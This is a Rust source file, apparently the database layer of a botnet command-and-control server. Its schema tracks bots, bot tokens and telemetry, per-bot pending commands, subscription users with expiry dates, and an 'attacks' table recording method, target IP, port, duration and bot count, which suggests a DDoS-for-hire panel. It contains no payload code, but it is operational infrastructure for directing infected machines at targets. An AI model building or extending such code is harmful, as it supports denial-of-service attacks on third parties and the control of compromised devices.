use sqlx::{sqlite::SqlitePoolOptions, Pool, Sqlite};
use std::path::Path;
use tokio::fs;
use super::error::Result;
pub type DbPool = Pool<Sqlite>;
pub async fn init_database(database_url: &str) -> Result<DbPool> {
    if let Some(parent) = Path::new(database_url.trim_start_matches("sqlite:")).parent() {
        fs::create_dir_all(parent).await?;
    }
    let pool = match SqlitePoolOptions::new()
        .max_connections(5)
        .connect(database_url)
        .await 
    {
        Ok(p) => p,
        Err(_) => {
            let path = database_url.trim_start_matches("sqlite:");
            fs::File::create(path).await?;
            SqlitePoolOptions::new()
                .max_connections(5)
                .connect(database_url)
                .await
                .map_err(|e| crate::modules::error::CncError::DatabaseError(e))?
        }
    };
    run_migrations(&pool).await?;
    Ok(pool)
}
async fn run_migrations(pool: &DbPool) -> Result<()> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS schema_migrations (
            version INTEGER PRIMARY KEY,
            applied_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )"
    )
    .execute(pool)
    .await
    .map_err(|e| crate::modules::error::CncError::DatabaseError(e))?;
    let current_version: i64 = sqlx::query_scalar("SELECT MAX(version) FROM schema_migrations")
        .fetch_one(pool)
        .await
        .unwrap_or(Some(0))
        .unwrap_or(0);
    let migrations = vec![
        (1, r#"
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password_hash TEXT NOT NULL,
            role TEXT NOT NULL,
            expiry_date DATETIME NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS bot_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token_hash TEXT NOT NULL UNIQUE,
            bot_id TEXT NOT NULL,
            arch TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_used_at DATETIME
        );
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            method TEXT NOT NULL,
            target_ip TEXT NOT NULL,
            target_port INTEGER NOT NULL,
            duration INTEGER NOT NULL,
            username TEXT NOT NULL,
            started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            finished_at DATETIME,
            status TEXT DEFAULT 'running',
            bot_count INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            action TEXT NOT NULL,
            target TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            details TEXT
        );
        CREATE TABLE IF NOT EXISTS bot_telemetry (
            bot_uuid TEXT PRIMARY KEY,
            arch TEXT NOT NULL,
            os TEXT,
            version TEXT,
            cpu_usage REAL,
            ram_usage REAL,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE TABLE IF NOT EXISTS blacklist (
            ip TEXT PRIMARY KEY,
            added_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            reason TEXT
        );
        CREATE TABLE IF NOT EXISTS whitelist (
            ip TEXT PRIMARY KEY,
            added_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            description TEXT
        );
        CREATE TABLE IF NOT EXISTS rate_limits (
            ip TEXT NOT NULL,
            attempt_time DATETIME NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_rate_limits_ip ON rate_limits(ip);
        CREATE INDEX IF NOT EXISTS idx_rate_limits_time ON rate_limits(attempt_time);
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            ip_address TEXT NOT NULL,
            attempt_time DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_login_attempts_username ON login_attempts(username);
        CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip_address);
        CREATE TABLE IF NOT EXISTS pending_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT NOT NULL,
            command TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        CREATE INDEX IF NOT EXISTS idx_pending_commands_bot_id ON pending_commands(bot_id);
        "#),
    ];
    for (version, sql) in migrations {
        if version > current_version {
            tracing::info!("Applying migration version {}", version);
            let mut tx = pool.begin().await.map_err(|e| crate::modules::error::CncError::DatabaseError(e))?;
            sqlx::query(sql)
                .execute(&mut *tx)
                .await
                .map_err(|e| crate::modules::error::CncError::DatabaseError(e))?;
            sqlx::query("INSERT INTO schema_migrations (version) VALUES (?)")
                .bind(version)
                .execute(&mut *tx)
                .await
                .map_err(|e| crate::modules::error::CncError::DatabaseError(e))?;
            tx.commit().await.map_err(|e| crate::modules::error::CncError::DatabaseError(e))?;
        }
    }
    Ok(())
}
